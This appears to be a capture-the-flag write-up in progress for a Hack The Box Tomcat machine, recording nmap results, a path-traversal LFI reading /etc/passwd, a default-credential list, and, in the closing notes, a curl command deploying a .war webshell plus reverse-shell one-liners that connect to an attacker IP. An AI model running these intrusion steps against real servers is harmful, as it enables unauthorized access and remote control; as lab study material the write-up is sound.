* I'm gonna try with the first one see if the code is readable to me.
* It's simple but not working :(
* It's not working because I'm looking in the wrong direction and the tomcat version is 9 not 2 which leaves me with no exploits on exploit-db.
* Found an exploit that affects tomcat-catalina version 9.0.31 is affected ( Needs Authentication ).  

* found these for the tomcat service and found some stuff in the examples directory but no luck with anything so far

* Found this vulnerability. Might be the one but it seems too new (https://www.sangfor.com/en/info-center/blog-center/cyber-security/apache-tomcat-deserialization-remote-code-execution-vulnerability) IRRELEVANT
* Try and look into this one or any other exploits for the apache version because it's quiet old (https://www.virsec.com/research-lab/cve-2020-11984-apache-http-server-2-4-32-to-2-4-44-mod_proxy_uwsgi-info-disclosure-and-possible-rce)

## Nmap Results  
  <img src="https://nmap.org/images/nmap-logo-256x256.png">   

* Initial nmap output  

  ```console
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  8080/tcp open  http	Apache Tomcat
  ```

* Full scan gives same results as the 1000 ports nmap scan.

## Thinking Out Loud

* DNS unauthorized zone transfer.  
* I found an LFI in this url `http://megahosting.htb/news.php?file=../../../../../../../etc/passwd` I was able to read the passwd file and I now know that there's a user called "ash"  
  ```console
  ash:x:1000:1000:clive:/home/ash:/bin/bash 
  ```

* It seems like the config file `tomcat-users.xml` is usually stored in `$CATALINA_HOME\conf\tomcat-users.xml` and the catalina home seems to be in the following dir  `CATALINA_HOME in /usr/share/tomcat9 `, so I will be trying this path `/usr/share/tomcat9/conf/tomcat-users.xml`.
* They say that credentials are usually stored on tomcat config files.  
* I must be able to open some file from the tomcat service in the port 80 service through the LFI vulnerability and this way I can get something. A credential or anything.

## <span style="color:#FF5050">Checklist ü§ì   

- [x] LFI
- [ ] ~~Maybe I can access data through this path somehow `/var/lib/tomcat9/webapps/ROOT/index.html`~~
- [ ] Scower the RUNNING.txt file for something.
- [ ] Maybe I can access data through this path somehow `/var/lib/tomcat9/webapps/ROOT/index.html`
- [x] Try default credentials for `/html/manager` and `/html/host-manager`.
- [ ] Bruteforce the `/html/manager` login credentials.

<br/><br/>


## <span style="color:#FF5050">What Do We Have? ü§îü§î 

* A `http://10.10.10.194:8080/manager/html` manager page that prompts me for a username and a password (Tried the defaults and they didn't work).
* Default credentials that could be the ones  
```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

<br/><br/> 

## <span style="color:#FF5050">Random NotesüëÄ  
* PHP is being used in the backend.  
* So LFI gives me access to files, let's call it, outside of the sandboxed environment but it does not allow me to read files I don't have privilege to read. So what am I supposed to do with it?
* I will use the manual exploit to try and understand it as much as I can (The upload war thing).
* It seems that I can't upload a .war file unless I have the right privileges which can be acquired if I have the roles admin, manager or manager-script and according to the `tomcat-users.xml` file I have the `manager-script` role.  
* The path was right infront of me in the HackTricks page in the RCE section. What lesson did I learn? Read articles properly and don't skip stuff.
* I will be creating a .war webshell and then I will upload it with this line of code  
  ```
  curl --upload-file webshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/webshell"
  ```  
* After creating the war file and uploading it using the previous curl code I can just visit the path `/webshell` with `?cmd=[COMMAND]` which will lead to executing the webshell.  
* Imma try and upload a reverse shell from the beginning and not a webshell  
```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.10.14.8/1234;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
